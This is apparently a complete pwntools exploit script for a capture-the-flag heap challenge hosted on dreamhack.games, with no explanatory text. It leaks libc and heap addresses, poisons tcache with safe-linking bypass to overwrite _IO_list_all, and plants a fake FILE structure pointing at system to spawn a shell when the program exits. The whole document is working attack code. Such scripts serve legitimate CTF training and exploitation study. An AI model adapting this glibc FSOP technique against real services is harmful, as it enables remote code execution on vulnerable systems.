from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 20177
r = remote(HOST, PORT)

def alloc(idx, s, data):
    r.sendlineafter(b'>> ', b'1')
    r.sendlineafter(b': ', b'%d'%idx)
    r.sendlineafter(b': ', b'%d'%s)
    r.sendafter(b': ', data)

def shrink(idx, val):
    r.sendlineafter(b'>> ', b'2')
    r.sendlineafter(b': ', b'%d'%idx)
    r.sendlineafter(b': ', b'%d'%val)

def expand(idx, val):
    r.sendlineafter(b'>> ', b'3')
    r.sendlineafter(b': ', b'%d'%idx)
    r.sendlineafter(b': ', b'%d'%val)

def chunk_read(idx):
    r.sendlineafter(b'>> ', b'4')
    r.sendlineafter(b': ', b'%d'%idx)

def chunk_write(idx, data):
    r.sendlineafter(b'>> ', b'5')
    r.sendlineafter(b': ', b'%d'%idx)
    r.sendafter(b': ', data)

def delete(idx):
    r.sendlineafter(b'>> ', b'6')
    r.sendlineafter(b': ', b'%d'%idx)

def exit():
    r.sendlineafter(b'>> ', b'7')

alloc(0, 0x500, b'A'*0x500)
alloc(1, 0x10, b'A'*0x10)
expand(0, 1)

alloc(0, 0x500, b'A'*8)
r.send(b'A'*8)
chunk_read(0)

r.recvuntil(b'Data: ' + b'A'*0x8)
libc = u64(r.recv(8)) - 0x203f00
heap = u64(r.recv(8))
key = heap >> 12

_IO_list_all = libc + 0x2044c0
_IO_wfile_jumps = libc + 0x202228
system = libc + 0x58740
file = heap + 0x20d80

alloc(2, 0x30, b'A'*0x30)
alloc(1, 0xc50, b'A'*0xc50)
alloc(0, 0x100, b'A'*0x100)
expand(0, 24)
chunk_write(0, b'A')
r.send(b'A'*0x18+p64(0x61))

delete(2)
alloc(2, 0xfff, b'A'*0xfff)

chunk_write(0, b'A')
r.send(b'A'*0x10 + p64(0x20) + p64(0x41) + p64(_IO_list_all ^ (key+1)))

payload = flat({
    0x0: b'\x01\x01\x01\x01;sh\x00',
    0x20: 0,
    0x28: 1,
    0x68: system,
    0x88: file+0x400,
    0xa0: file,
    0xd8: _IO_wfile_jumps,
    0xe0: file,
},filler=b'\x00')

chunk_write(2, payload.ljust(0xfff,b'\x00'))

alloc(0, 0x30, b'A'*0x30)
alloc(0, 0x30, b'A')
r.send(p64(file))

exit()

r.interactive()